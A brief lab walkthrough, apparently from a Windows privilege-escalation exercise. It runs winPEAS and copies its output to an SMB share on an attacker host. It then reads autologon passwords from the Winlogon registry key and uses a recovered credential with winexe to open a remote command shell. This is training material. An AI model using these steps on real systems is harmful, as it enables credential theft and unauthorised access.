1x7 Passwords - Registry

```bash
.\winPEASany.exe ansi quiet > wpeas_full_op.txt
copy C:\PrivEsc\wpeas_full_op.txt \\10.9.4.127\kali\wpeas_full_op.txt
cat wpeas_full_op.txt
```
![8c05826e1b0b6cb35e8594acde40cb94.png](../_resources/a7f173b248cd4687b0f4913d69c1a8fb.png)

```console
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
![7c5c030521bb38be858e36067825832d.png](../_resources/ec03212db6a54b3b83ada84eb6eea68b.png)

```bash
winexe -U 'admin%password123' //10.10.206.176 cmd.exe
```
![44180e2d95b744119f2638336fdd5f05.png](../_resources/2e36dae09ea841b69e864732f0bcc130.png)